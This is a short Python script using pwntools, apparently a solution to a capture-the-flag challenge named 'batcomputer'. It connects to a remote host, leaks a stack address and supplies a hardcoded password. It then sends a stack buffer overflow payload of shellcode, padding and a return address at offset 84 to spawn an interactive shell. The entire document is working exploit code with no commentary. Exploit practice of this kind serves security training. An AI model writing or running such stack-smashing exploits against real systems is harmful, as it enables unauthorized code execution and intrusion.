#!usr/bin/env python3

from pwn import *
def main():

    #context.log_level = 'DEBUG'

    context(os='linux', arch='amd64' )

    #io = process('./batcomputer')
    io = remote('209.97.179.123','31958')
    password='b4tp@$$w0rd!'
    return_address_offset = 84

    io.sendlineafter('>', '1')
    stack_address = io.recvline().strip().split()[-1]
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)])
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address, endian='big')
    log.success(f'Leaked stack address: {p64(stack_address)}')

    io.sendlineafter('>', '2')
    io.sendlineafter('password', password)
    shellcode = asm(
        shellcraft.popad() +
        shellcraft.sh())
    padding = b'a' * (return_address_offset - len(shellcode))
    payload = shellcode + padding + p64(stack_address)
    io.sendlineafter('commands', payload)
    
    io.sendlineafter('>', '3')
    
    io.interactive()

if __name__ == '__main__':
    main()